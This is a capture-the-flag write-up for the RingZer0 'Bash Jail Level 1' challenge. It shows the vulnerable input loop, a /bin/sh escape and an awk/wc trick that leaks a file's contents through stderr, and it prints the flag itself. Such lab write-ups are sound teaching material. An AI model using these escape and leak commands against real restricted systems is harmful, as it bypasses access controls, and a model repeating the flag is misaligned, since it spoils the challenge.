# Bash jail 1 - Challenge 218

```
RingZer0 Team Online CTF

BASH Jail Level 1:
Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)

Flag is located at /home/level1/flag.txt

Challenge bash code:
-----------------------------

while :
do
        echo "Your input:"
        read input
        output=`$input`
done

-----------------------------
Your input:
```

We can get a shell with:

```
/bin/sh
sh-4.3$
```

stdout is redirected so we can't just cat the flag:

```
sh-4.3$ cat /home/level1/flag.txt
sh-4.3$
```

Instead we'll try to get it with stderr

```
sh-4.3$ awk '{system("wc "$1)}' /home/level1/flag.txt
wc: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: No such file or directory
```
